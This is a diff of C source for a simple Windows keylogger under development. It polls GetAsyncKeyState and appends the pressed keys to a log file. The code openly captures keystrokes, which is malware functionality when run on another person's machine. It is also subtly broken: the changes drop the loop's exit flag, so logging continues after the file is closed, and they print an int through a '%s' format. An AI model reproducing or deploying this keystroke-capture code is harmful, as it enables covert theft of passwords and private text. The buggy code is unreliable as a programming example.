@@ -5,6 +5,7 @@
     SaveInt - Save key input states in a log file (broken)
     Save - Save key input in a log file (broken)
     Probable cause of everything being broken: Checking the wrong keycode.
+    Cause: Checking for equality instead of setting an array element..
 */
 
 #include <windows.h>
@@ -31,29 +32,28 @@ int Save(int _key, char *file){
     FILE *OUTPUT_FILE;
     OUTPUT_FILE = fopen(file, "a+");
     fprintf(OUTPUT_FILE, "START\n");
-    
     int activeKey = 1;
-    int pressedChars[254];
+    int pressedChars[255+8];
 
-    for(int iteration = 0; iteration < sizeof(pressedChars); iteration++){
+    for(int iteration = 0; iteration < 255+8; iteration++){
         pressedChars[iteration] = 0;
     }
 
     while (activeKey == 1){
         Sleep(10);
-        for (char i = 8; i < 255; i++){
-            if ((GetAsyncKeyState(i) & 0x8000) && (i == 0x42)){
-                activeKey = 0;
-                fprintf(OUTPUT_FILE, "END");
+        for (int i = 8; i < 255; i++){
+            int keyState = GetAsyncKeyState(i);
+            if ((keyState & 0x8000) && (i == 0x42)){
+                fprintf(OUTPUT_FILE, "END\n");
                 fclose(OUTPUT_FILE);
                 break;
             }
-            if ((GetAsyncKeyState(i) & 0x8000 & (pressedChars[i-8] == 0))){
-                pressedChars[i-8] == 1;
+            if (!(keyState) && (pressedChars[i] == 1)){
+                fprintf(OUTPUT_FILE, "%s", &i);
+                pressedChars[i] = 0;
             }
-            if (((GetAsyncKeyState(i) & 0x0000) & (pressedChars[i-8] == 1))){
-                pressedChars[i-8] == 0;
-                fprintf(OUTPUT_FILE, "%s,%d\n", &i,i);
+            if ((keyState & 0x8000) && (pressedChars[i] == 0)){
+                pressedChars[i] = 1;
             }
         }
     }
@@ -68,4 +68,3 @@ int SaveInt(int number, char *file){
     fclose(OUTPUT_FILE);
     return 0;
 }
-
